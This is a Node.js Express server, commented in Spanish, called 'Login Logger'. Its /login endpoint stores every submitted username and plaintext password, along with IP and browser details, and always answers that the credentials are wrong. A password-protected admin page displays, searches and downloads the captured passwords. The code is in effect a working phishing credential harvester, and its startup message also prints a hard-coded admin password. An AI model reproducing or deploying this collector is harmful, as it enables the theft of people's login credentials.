/**
 * LOGIN LOGGER — Server
 * Captura todos los eventos posibles con IP y timestamp.
 * Las credenciales de admin se almacenan como hashes bcrypt.
 *
 * Para generar nuevos hashes de tus propias credenciales:
 *   Busca en intenret un generador de hashes bcrypt (cost 12) o usa Node.js:
 *      node -e "require('bcrypt').hash('TU_VALOR', 12).then(console.log)"
 *
 * Variables de entorno soportadas:
 *   PORT             Puerto del servidor (default: 3000)
 *   ADMIN_USER_HASH  Hash bcrypt del usuario admin
 *   ADMIN_PASS_HASH  Hash bcrypt de la contraseña admin
 */

const express = require("express");
const path = require("path");
const fs = require("fs");
const bcrypt = require("bcryptjs");
const winston = require("winston");
const rateLimit = require("express-rate-limit");
const helmet = require("helmet");

const app = express();
const PORT = process.env.PORT || 3000;

const ADMIN_USER_HASH = process.env.ADMIN_USER_HASH ||
  "$2b$12$fIqzFF.jdu5lcT7/uhrd6ejD5MaoN/yeEKXwYGSZeOb/GoIrieDhe";

const ADMIN_PASS_HASH = process.env.ADMIN_PASS_HASH ||
  "$2b$12$CtjIMHgVJWakAJU3V/cWB.V9oHkVYlS/4IyWWyA2eHrrsCsm7tOqu";

const logsDir = path.join(__dirname, "logs");
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(
    winston.format.timestamp({ format: "YYYY-MM-DD HH:mm:ss" }),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({
      filename: path.join(logsDir, "access.log"),
      maxsize: 10 * 1024 * 1024,
      maxFiles: 10,
      tailable: true,
    }),
    new winston.transports.File({
      filename: path.join(logsDir, "error.log"),
      level: "error",
      maxsize: 5 * 1024 * 1024,
      maxFiles: 5,
      tailable: true,
    }),
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.printf(({ timestamp, level, message, ...meta }) =>
          `${timestamp} [${level}] ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ""}`
        )
      ),
    }),
  ],
});

// ──────────────────────────────────────────────────────────
// HELPERS
// ──────────────────────────────────────────────────────────
function getClientIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.headers["x-real-ip"] ||
    req.headers["cf-connecting-ip"] ||
    req.headers["true-client-ip"] ||
    req.socket?.remoteAddress ||
    req.connection?.remoteAddress ||
    "unknown"
  );
}

function buildLogEntry(req, extra = {}) {
  return {
    ip: getClientIP(req),
    method: req.method,
    path: req.path,
    userAgent: req.headers["user-agent"] || "unknown",
    referer: req.headers["referer"] || null,
    language: req.headers["accept-language"] || null,
    encoding: req.headers["accept-encoding"] || null,
    origin: req.headers["origin"] || null,
    host: req.headers["host"] || null,
    ...extra,
  };
}

// ──────────────────────────────────────────────────────────
// MIDDLEWARES GLOBALES
// ──────────────────────────────────────────────────────────
app.use(helmet({ contentSecurityPolicy: false }));
app.set("trust proxy", 1);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Solo se loguean eventos relevantes (login_attempt, admin_access, admin_access_denied)
// No se registra cada petición HTTP genérica

// ──────────────────────────────────────────────────────────
// RATE LIMITER
// ──────────────────────────────────────────────────────────
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,
  keyGenerator: (req) => getClientIP(req),
  handler: (req, res) => {
    logger.warn("rate_limit_exceeded", { ...buildLogEntry(req), event: "RATE_LIMIT" });
    res.status(429).json({ success: false, error: "Demasiados intentos. Espera 15 minutos." });
  },
});

// ──────────────────────────────────────────────────────────
// ARCHIVOS ESTÁTICOS
// ──────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, "public")));

// ──────────────────────────────────────────────────────────
// POST /login
// ──────────────────────────────────────────────────────────
app.post("/login", loginLimiter, (req, res) => {
  const { username, password } = req.body;

  logger.info("login_attempt", buildLogEntry(req, {
    event: "LOGIN_ATTEMPT",
    username: username || "(vacío)",
    password: password || "(vacío)",
    passwordLength: password ? password.length : 0,
  }));

  res.status(401).json({
    success: false,
    error: "Credenciales incorrectas. Por favor, inténtalo de nuevo.",
  });
});

// ──────────────────────────────────────────────────────────
// MIDDLEWARE AUTH ADMIN — Basic Auth con comparación bcrypt
// ──────────────────────────────────────────────────────────
async function basicAuth(req, res, next) {
  const authHeader = req.headers["authorization"];

  if (!authHeader || !authHeader.startsWith("Basic ")) {
    res.setHeader("WWW-Authenticate", 'Basic realm="Admin Logs"');
    return res.status(401).send("Acceso no autorizado");
  }

  const decoded = Buffer.from(authHeader.split(" ")[1], "base64").toString();
  const colonIdx = decoded.indexOf(":");
  const user = decoded.slice(0, colonIdx);
  const pass = decoded.slice(colonIdx + 1);

  // Comparación timing-safe sobre hashes
  const [userOk, passOk] = await Promise.all([
    bcrypt.compare(user || "", ADMIN_USER_HASH),
    bcrypt.compare(pass || "", ADMIN_PASS_HASH),
  ]);

  if (userOk && passOk) {
    logger.info("admin_access", { ...buildLogEntry(req), event: "ADMIN_LOG_VIEW" });
    return next();
  }

  logger.warn("admin_access_denied", {
    ...buildLogEntry(req),
    event: "ADMIN_UNAUTHORIZED",
    attemptedUser: user,
  });
  res.setHeader("WWW-Authenticate", 'Basic realm="Admin Logs"');
  return res.status(401).send("Credenciales de administrador incorrectas");
}

// ──────────────────────────────────────────────────────────
// GET /admin/logs — visor web
// ──────────────────────────────────────────────────────────
app.get("/admin/logs", basicAuth, (req, res) => {
  const logFile = path.join(logsDir, "access.log");
  if (!fs.existsSync(logFile)) return res.send(buildLogViewerHTML([], 200, "", ""));

  const limit = Math.min(parseInt(req.query.limit) || 200, 5000);
  const filter = req.query.filter || "";
  const type = req.query.type || "";

  // Solo eventos relevantes para el visor
  const RELEVANT = ["login_attempt", "admin_access", "admin_access_denied", "rate_limit_exceeded"];

  let lines = fs.readFileSync(logFile, "utf-8")
    .split("\n")
    .filter(Boolean)
    .map(l => { try { return JSON.parse(l); } catch { return null; } })
    .filter(l => l && RELEVANT.includes(l.message));

  if (filter) lines = lines.filter(l =>
    JSON.stringify(l).toLowerCase().includes(filter.toLowerCase())
  );
  if (type) lines = lines.filter(l => l.message === type);

  lines = lines.reverse().slice(0, limit);
  res.send(buildLogViewerHTML(lines, limit, filter, type));
});

// GET /admin/logs/download
app.get("/admin/logs/download", basicAuth, (req, res) => {
  const logFile = path.join(logsDir, "access.log");
  if (!fs.existsSync(logFile)) return res.status(404).send("No hay logs disponibles.");
  res.download(logFile, "access.log");
});

// GET /admin/logout — invalida las credenciales Basic Auth del navegador
app.get("/admin/logout", (req, res) => {
  logger.info("admin_logout", { ...buildLogEntry(req), event: "ADMIN_LOGOUT" });
  // Devolver 401 con nuevo realm para forzar al navegador a borrar las credenciales cacheadas
  res.setHeader("WWW-Authenticate", 'Basic realm="logged-out"');
  res.status(401).send(`<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta http-equiv="refresh" content="2;url=/"/>
  <title>Sesión cerrada</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
</head>
<body class="bg-light d-flex align-items-center justify-content-center" style="height:100vh;">
  <div class="text-center">
    <div class="display-1 mb-3">👋</div>
    <h4 class="fw-semibold">Sesión cerrada correctamente</h4>
    <p class="text-muted">Redirigiendo al inicio…</p>
  </div>
</body>
</html>`);
});

// ──────────────────────────────────────────────────────────
// 404 y 500
// ──────────────────────────────────────────────────────────
app.use((req, res) => {
  logger.warn("not_found", { ...buildLogEntry(req), event: "404_NOT_FOUND" });
  res.status(404).json({ error: "Ruta no encontrada" });
});

app.use((err, req, res, next) => {
  logger.error("server_error", {
    ...buildLogEntry(req), event: "500_SERVER_ERROR", error: err.message,
  });
  res.status(500).json({ error: "Error interno del servidor" });
});

// ──────────────────────────────────────────────────────────
// HTML VISOR DE LOGS — Bootstrap 5, tonos claros, responsive
// Un único archivo HTML generado dinámicamente
// ──────────────────────────────────────────────────────────
function buildLogViewerHTML(lines, limit, filter, type) {

  const total = lines.length;
  const loginCount = lines.filter(l => l.message === "login_attempt").length;
  const adminDenied = lines.filter(l => l.message === "admin_access_denied").length;
  const rateLimited = lines.filter(l => l.message === "rate_limit_exceeded").length;
  const uniqueIPs = new Set(lines.map(l => l.ip).filter(Boolean)).size;

  function esc(s) {
    if (s == null) return "";
    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
  }

  function levelBadge(l) {
    const map = { info: "primary", warn: "warning text-dark", error: "danger" };
    return `<span class="badge rounded-pill bg-${map[l] || "secondary"} px-2">${esc(l)}</span>`;
  }

  function eventBadge(msg) {
    const map = {
      login_attempt: ["login-badge", "🔑 login_attempt"],
      admin_access: ["success", "🛡 admin_access"],
      admin_access_denied: ["danger", "⛔ admin_denied"],
      rate_limit_exceeded: ["warning text-dark", "🚫 rate_limit"],
    };
    const [cls, label] = map[msg] || ["secondary", esc(msg) || "—"];
    if (cls === "login-badge") {
      return `<span class="badge rounded-pill px-2" style="background:#fff0f0;color:#c0392b;border:1px solid #f5c6c6;">${label}</span>`;
    }
    return `<span class="badge rounded-pill bg-${cls} px-2">${label}</span>`;
  }

  function statusBadge(code) {
    if (!code) return '<span class="text-muted">—</span>';
    const cls = code < 300 ? "success" : code < 400 ? "info text-dark" : code < 500 ? "warning text-dark" : "danger";
    return `<span class="badge bg-${cls}">${code}</span>`;
  }

  function methodBadge(m) {
    if (!m) return "";
    const cls = m === "GET" ? "success" : m === "POST" ? "primary" : m === "DELETE" ? "danger" : "secondary";
    return `<span class="badge bg-${cls} bg-opacity-10 text-${cls} border border-${cls} border-opacity-25 font-mono">${m}</span>`;
  }

  const rows = lines.map(l => {
    const isLogin = l.message === "login_attempt";
    const isDenied = l.message === "admin_access_denied";
    const rowCls = isLogin ? "row-login" : isDenied ? "row-denied" : "";
    return `
    <tr class="${rowCls}">
      <td class="text-nowrap small font-mono text-secondary">${esc(l.timestamp) || "—"}</td>
      <td><code class="ip-code">${esc(l.ip) || "—"}</code></td>
      <td>${eventBadge(l.message)}</td>
      <td class="text-nowrap">${methodBadge(l.method)} <code class="small text-dark">${esc(l.path) || ""}</code></td>
      <td>${statusBadge(l.statusCode)}</td>
      <td>${isLogin || isDenied ? `<strong class="text-danger">${esc(l.username || l.attemptedUser)}</strong>` : '<span class="text-muted">—</span>'}</td>
      <td>${isLogin ? `<code class="pw-code">${esc(l.password)}</code>` : '<span class="text-muted">—</span>'}</td>
      <td class="small text-muted text-truncate" style="max-width:180px" title="${esc(l.userAgent)}">${esc(l.userAgent) || "—"}</td>
      <td class="small text-secondary font-mono text-truncate" style="max-width:120px" title="${esc(l.language)}">${esc(l.language) || "—"}</td>
    </tr>`;
  }).join("");

  const typeOpts = [
    ["", "Todos los eventos"],
    ["login_attempt", "🔑 login_attempt"],
    ["admin_access", "🛡 admin_access"],
    ["admin_access_denied", "⛔ admin_denied"],
    ["rate_limit_exceeded", "🚫 rate_limit"],
  ].map(([v, l]) => `<option value="${v}" ${type === v ? "selected" : ""}>${l}</option>`).join("");

  const limitOpts = [50, 100, 200, 500, 1000]
    .map(n => `<option value="${n}" ${n == limit ? "selected" : ""}>${n} entradas</option>`).join("");

  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Login Logger · Admin</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"/>
  <style>
    :root {
      --font-body: 'Inter', system-ui, sans-serif;
      --font-mono: 'JetBrains Mono', monospace;
      --clr-bg: #f0f4f8;
      --clr-surface: #ffffff;
      --clr-border: #e2e8f0;
      --clr-text: #1e293b;
      --clr-muted: #94a3b8;
      --clr-accent: #3b82f6;
      --topbar-h: 58px;
      --radius-card: 14px;
      --shadow-card: 0 1px 3px rgba(0,0,0,.06), 0 4px 16px rgba(0,0,0,.04);
    }
    *, *::before, *::after { box-sizing: border-box; }
    body { font-family: var(--font-body); background: var(--clr-bg); color: var(--clr-text); font-size: .875rem; margin: 0; }
    .font-mono { font-family: var(--font-mono) !important; }

    /* ── Topbar ── */
    .topbar {
      position: fixed; top: 0; left: 0; right: 0; z-index: 1040;
      background: var(--clr-surface);
      border-bottom: 1px solid var(--clr-border);
      height: var(--topbar-h);
      display: flex; align-items: center; gap: .75rem;
      padding: 0 1.5rem;
      box-shadow: 0 1px 4px rgba(0,0,0,.06);
    }
    .topbar-brand {
      font-weight: 700; font-size: 1rem; color: var(--clr-text);
      text-decoration: none; display: flex; align-items: center; gap: .5rem;
    }
    .topbar-brand .logo {
      width: 32px; height: 32px; border-radius: 8px;
      background: linear-gradient(135deg, #3b82f6, #6366f1);
      display: grid; place-items: center; color: #fff; font-size: .85rem;
    }
    .live-indicator { display: flex; align-items: center; gap: .4rem; font-size: .72rem; color: var(--clr-muted); }
    .live-dot {
      width: 7px; height: 7px; border-radius: 50%; background: #22c55e;
      animation: livePulse 2s infinite;
    }
    @keyframes livePulse {
      0%   { box-shadow: 0 0 0 0   rgba(34,197,94,.45); }
      70%  { box-shadow: 0 0 0 6px rgba(34,197,94,0);   }
      100% { box-shadow: 0 0 0 0   rgba(34,197,94,0);   }
    }
    .topbar-right { margin-left: auto; display: flex; align-items: center; gap: .6rem; }

    /* ── Page layout ── */
    .page-wrap {
      max-width: 1600px; margin: 0 auto;
      padding: calc(var(--topbar-h) + 1.5rem) 1.25rem 3rem;
    }

    /* ── Stat cards ── */
    .stat-card {
      background: var(--clr-surface);
      border: 1px solid var(--clr-border);
      border-radius: var(--radius-card);
      padding: 1.1rem 1.3rem;
      display: flex; align-items: center; gap: 1rem;
      box-shadow: var(--shadow-card);
      transition: transform .15s, box-shadow .15s;
    }
    .stat-card:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(0,0,0,.08); }
    .stat-icon { width: 46px; height: 46px; border-radius: 12px; display: grid; place-items: center; font-size: 1.25rem; flex-shrink: 0; }
    .stat-value { font-size: 1.7rem; font-weight: 700; line-height: 1; letter-spacing: -.02em; }
    .stat-label { font-size: .68rem; color: var(--clr-muted); text-transform: uppercase; letter-spacing: .08em; margin-top: 3px; }

    /* ── Filter card ── */
    .filter-card { background: var(--clr-surface); border: 1px solid var(--clr-border); border-radius: var(--radius-card); padding: 1.1rem 1.3rem; box-shadow: var(--shadow-card); }
    .filter-card .form-control, .filter-card .form-select { font-size: .82rem; border-color: var(--clr-border); background: #f8fafc; }
    .filter-card .form-control:focus, .filter-card .form-select:focus { background: #fff; border-color: var(--clr-accent); box-shadow: 0 0 0 3px rgba(59,130,246,.14); }
    .filter-label { font-size: .7rem; font-weight: 600; text-transform: uppercase; letter-spacing: .07em; color: var(--clr-muted); margin-bottom: .4rem; }

    /* ── Table card ── */
    .table-card { background: var(--clr-surface); border: 1px solid var(--clr-border); border-radius: var(--radius-card); overflow: hidden; box-shadow: var(--shadow-card); }
    .table-card-header { padding: .9rem 1.3rem; border-bottom: 1px solid var(--clr-border); display: flex; align-items: center; gap: .75rem; flex-wrap: wrap; background: #fafbfc; }
    .table-card-title { font-weight: 600; font-size: .9rem; color: var(--clr-text); display: flex; align-items: center; gap: .5rem; }

    /* The key fix: thead does NOT use sticky — we let the page scroll naturally */
    .table { margin: 0; font-size: .8rem; }
    .table thead th {
      background: #f1f5f9;
      border-bottom: 2px solid #dde3ec !important;
      color: #475569; font-size: .68rem;
      text-transform: uppercase; letter-spacing: .08em;
      font-weight: 700; white-space: nowrap;
      padding: .75rem 1rem;
    }
    .table tbody td { padding: .6rem 1rem; vertical-align: middle; border-color: #f1f5f9 !important; }
    .table tbody tr:hover td { background: #f8fbff; }

    /* Row highlights */
    .row-login td  { background: #fff5f5; }
    .row-denied td { background: #fff8f0; }
    .row-login:hover td  { background: #ffe4e4 !important; }
    .row-denied:hover td { background: #fdefd8 !important; }

    /* Code pills */
    .ip-code { font-family: var(--font-mono); font-size: .78em; background: #eff6ff; color: #2563eb; padding: 2px 7px; border-radius: 6px; white-space: nowrap; }
    .pw-code { font-family: var(--font-mono); font-size: .78em; background: #fff1f2; color: #dc2626; padding: 2px 7px; border-radius: 6px; word-break: break-all; }

    /* Empty state */
    .empty-state { padding: 4rem 2rem; text-align: center; color: var(--clr-muted); }
    .empty-state .bi { font-size: 3rem; color: #cbd5e1; }

    /* Footer */
    .page-footer { text-align: center; color: var(--clr-muted); font-size: .72rem; padding-top: .75rem; }

    /* Scrollbar */
    ::-webkit-scrollbar { width: 5px; height: 5px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
  </style>
</head>
<body>

<!-- ══ TOPBAR ══════════════════════════════════════════════ -->
<header class="topbar">
  <a href="/admin/logs" class="topbar-brand">
    <span class="logo"><i class="bi bi-shield-lock-fill"></i></span>
    Login Logger
    <span class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25 rounded-pill px-2" style="font-size:.62rem;font-weight:600;letter-spacing:.04em;">ADMIN</span>
  </a>

  <div class="live-indicator">
    <span class="live-dot"></span>
    <span class="d-none d-sm-inline">En vivo</span>
  </div>

  <div class="topbar-right">
    <span class="text-muted d-none d-lg-inline" style="font-size:.72rem;">
      <i class="bi bi-clock me-1"></i>${new Date().toLocaleString("es-ES")}
    </span>
    <span class="text-muted d-none d-md-inline" style="font-size:.72rem;">
      &nbsp;·&nbsp; Refresh en <strong id="cntd">30</strong>s
    </span>
    <a href="/admin/logs/download" class="btn btn-sm btn-outline-primary d-flex align-items-center gap-1">
      <i class="bi bi-download"></i>
      <span class="d-none d-sm-inline">.log</span>
    </a>
    <button onclick="doLogout()" class="btn btn-sm btn-outline-danger d-flex align-items-center gap-1">
      <i class="bi bi-box-arrow-right"></i>
      <span class="d-none d-sm-inline">Salir</span>
    </button>
  </div>
</header>

<!-- ══ CONTENIDO ═══════════════════════════════════════════ -->
<div class="page-wrap">

  <!-- Stat cards -->
  <div class="row g-3 mb-4">
    <div class="col-6 col-md-4 col-xl">
      <div class="stat-card">
        <div class="stat-icon" style="background:#fff0f0;color:#e53e3e;"><i class="bi bi-key-fill"></i></div>
        <div>
          <div class="stat-value" style="color:#e53e3e;">${loginCount}</div>
          <div class="stat-label">Intentos login</div>
        </div>
      </div>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <div class="stat-card">
        <div class="stat-icon" style="background:#eff6ff;color:#3b82f6;"><i class="bi bi-collection-fill"></i></div>
        <div>
          <div class="stat-value" style="color:#3b82f6;">${total}</div>
          <div class="stat-label">Total registros</div>
        </div>
      </div>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <div class="stat-card">
        <div class="stat-icon" style="background:#fff8f0;color:#dd6b20;"><i class="bi bi-shield-exclamation"></i></div>
        <div>
          <div class="stat-value" style="color:#dd6b20;">${adminDenied}</div>
          <div class="stat-label">Accesos admin denegados</div>
        </div>
      </div>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <div class="stat-card">
        <div class="stat-icon" style="background:#fefce8;color:#ca8a04;"><i class="bi bi-slash-circle-fill"></i></div>
        <div>
          <div class="stat-value" style="color:#ca8a04;">${rateLimited}</div>
          <div class="stat-label">Rate limits</div>
        </div>
      </div>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <div class="stat-card">
        <div class="stat-icon" style="background:#f0fdf4;color:#16a34a;"><i class="bi bi-globe2"></i></div>
        <div>
          <div class="stat-value" style="color:#16a34a;">${uniqueIPs}</div>
          <div class="stat-label">IPs únicas</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Filter bar -->
  <div class="filter-card mb-4">
    <form method="GET" action="/admin/logs" class="row g-3 align-items-end">
      <div class="col-12 col-sm-6 col-lg-4">
        <div class="filter-label"><i class="bi bi-search me-1"></i>Buscar</div>
        <div class="input-group">
          <span class="input-group-text bg-white border-end-0" style="border-color:#e2e8f0;"><i class="bi bi-search text-muted" style="font-size:.78rem;"></i></span>
          <input type="text" name="filter" class="form-control border-start-0" placeholder="IP, usuario, contraseña…" value="${esc(filter)}"/>
        </div>
      </div>
      <div class="col-6 col-sm-3 col-lg-2">
        <div class="filter-label"><i class="bi bi-tag me-1"></i>Evento</div>
        <select name="type" class="form-select">${typeOpts}</select>
      </div>
      <div class="col-6 col-sm-3 col-lg-2">
        <div class="filter-label"><i class="bi bi-list-ol me-1"></i>Límite</div>
        <select name="limit" class="form-select">${limitOpts}</select>
      </div>
      <div class="col-12 col-lg-4 d-flex gap-2">
        <button type="submit" class="btn btn-primary flex-grow-1">
          <i class="bi bi-funnel-fill me-1"></i>Filtrar
        </button>
        <a href="/admin/logs" class="btn btn-outline-secondary px-3" title="Limpiar filtros">
          <i class="bi bi-x-lg"></i>
        </a>
      </div>
    </form>
  </div>

  <!-- Table -->
  <div class="table-card">
    <div class="table-card-header">
      <span class="table-card-title"><i class="bi bi-table text-primary"></i> Registros de actividad</span>
      <span class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25">${total} entradas</span>
      ${filter ? `<span class="badge bg-warning bg-opacity-15 text-warning-emphasis border border-warning border-opacity-25"><i class="bi bi-funnel-fill me-1"></i>Filtro: "${esc(filter)}"</span>` : ""}
    </div>

    ${total === 0 ? `
    <div class="empty-state">
      <i class="bi bi-inbox d-block mb-3"></i>
      <p class="fw-semibold text-secondary">No hay registros que mostrar</p>
      <p class="small">Ajusta los filtros o espera a que lleguen nuevos eventos.</p>
    </div>` : `
    <div class="table-responsive">
      <table class="table table-hover mb-0">
        <thead>
          <tr>
            <th><i class="bi bi-clock me-1"></i>Timestamp</th>
            <th><i class="bi bi-geo-alt me-1"></i>IP Cliente</th>
            <th>Evento</th>
            <th>Método / Ruta</th>
            <th>HTTP</th>
            <th><i class="bi bi-person me-1"></i>Usuario</th>
            <th><i class="bi bi-key me-1"></i>Contraseña</th>
            <th>User-Agent</th>
            <th><i class="bi bi-translate me-1"></i>Idioma</th>
          </tr>
        </thead>
        <tbody>${rows}</tbody>
      </table>
    </div>`}
  </div>

  <div class="page-footer mt-3">
    Mostrando <strong>${total}</strong> registros (más recientes primero) &nbsp;·&nbsp;
    Auto-refresh en <strong><span id="cntd2">30</span>s</strong>
  </div>

</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
  // Auto-refresh countdown
  let s = 30;
  const c1 = document.getElementById("cntd");
  const c2 = document.getElementById("cntd2");
  setInterval(() => {
    s--;
    if (c1) c1.textContent = s;
    if (c2) c2.textContent = s;
    if (s <= 0) location.reload();
  }, 1000);

  // Row highlight on click
  document.querySelectorAll("tbody tr").forEach(tr => {
    tr.style.cursor = "pointer";
    tr.addEventListener("click", () => {
      document.querySelectorAll("tbody tr.table-active").forEach(r => r.classList.remove("table-active"));
      tr.classList.toggle("table-active");
    });
  });

  // Tooltips
  document.querySelectorAll("[title]").forEach(el => new bootstrap.Tooltip(el, { trigger: "hover", placement: "top" }));

  // Logout: envía credenciales inválidas para forzar al navegador a borrar el Basic Auth cacheado
  function doLogout() {
    fetch("/admin/logout", {
      headers: { "Authorization": "Basic " + btoa("logout:logout") }
    }).finally(() => {
      window.location.href = "/";
    });
  }
</script>
</body>
</html>`;
}

// ──────────────────────────────────────────────────────────
// ARRANCAR EL SERVIDOR
// ──────────────────────────────────────────────────────────
app.listen(PORT, () => {
  logger.info("server_start", { event: "SERVER_STARTED", port: PORT, pid: process.pid });
  console.log(`\n🚀  Servidor en   http://localhost:${PORT}`);
  console.log(`📊  Visor de logs http://localhost:${PORT}/admin/logs`);
  console.log(`   (usuario: admin | contraseña: supersecret123)\n`);
});
